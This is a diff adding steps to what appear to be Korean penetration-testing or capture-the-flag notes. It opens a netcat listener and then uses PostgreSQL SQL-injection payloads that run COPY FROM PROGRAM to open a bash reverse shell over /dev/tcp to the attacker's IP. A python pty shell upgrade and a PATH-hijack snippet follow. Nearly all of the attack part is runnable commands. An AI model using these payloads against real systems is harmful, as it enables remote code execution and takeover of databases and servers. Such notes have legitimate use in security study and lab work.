@@ -51,3 +51,21 @@ echo '/bin/sh' > cat
 chmod +x cat
 ```
 #
+1. 포트 1234(또는 수신하려는 포트)를 통해 대상 시스템의 IPv4 주소에서 공격 시스템의 IPv4 주소로의 모든 TCP 인바운드 연결을 허용
+```
+sudo ufw allow from <target ip> proto tcp to any port 1234
+nc -lvnp 1234
+```
+2. 
+![image](https://user-images.githubusercontent.com/61821641/150576818-3437aa8c-226b-412d-8402-1d33fb6a8cdf.png)
+```
+'; CREATE TABLE cmd_exec(cmd_output text); --
+'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/<my ip>/1234 0>&1'''; -- 
+```
+3. 상호작용적인 shell 만들기
+```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+![image](https://user-images.githubusercontent.com/61821641/150577289-9a5f4915-a62c-4851-bbdd-c6663af8688a.png)
+
+
